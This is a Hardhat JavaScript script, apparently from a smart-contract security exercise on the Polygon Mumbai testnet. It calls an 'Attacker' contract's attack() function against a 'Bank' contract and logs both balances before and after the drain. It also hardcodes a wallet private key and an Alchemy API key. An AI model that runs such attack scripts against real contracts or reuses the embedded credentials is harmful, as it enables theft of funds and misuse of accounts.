// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

let BANK = "0x07CDfA7A454Ef05db08c9C11261A222392EDB696";
let ATTACKER = "0x48959bd965c11Ff0F9C12Ef0Bb4eAE2bdBe1dB59";
let ATTACKERCONT = "0x7B83a34b28DDCfBEc7dCC53Dc1C32FF27f987CE5";
let PRIVATEKEY =
	"0xc7e1504b88e4427aa61ca1e3d2bedd49c40b2c051a3288331366ed7100d72989";

let API_KEY = "vZF-bLS5x-6QJAXdpq-LNZ4S2_TZi2_P";

async function main() {
	//it("Perform Attack", async function () {

	// For Hardhat
	const contract = require("../artifacts/contracts/Attacker.sol/Attacker.json");

	// Provider
	const alchemyProvider = new ethers.providers.AlchemyProvider(
		(network = "maticmum"),
		API_KEY
	);

	// Signer
	const owner = new ethers.Wallet(PRIVATEKEY, alchemyProvider);

	// Contract
	const attackerContract = new ethers.Contract(
		ATTACKERCONT,
		contract.abi,
		owner
	);

	console.log(`${owner.address}`);
	//console.log(JSON.stringify(contract.abi));

	console.log("");
	console.log("*** Before ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attacker's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);

	await attackerContract.attack({
		value: ethers.utils.parseEther("0.000001"),
	});

	console.log("");
	console.log("*** After ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attackers's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);
	console.log("");

	// expect(await ethers.provider.getBalance(this.bankContract.address)).to.eq(
	// 	0
	// );
	//});
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
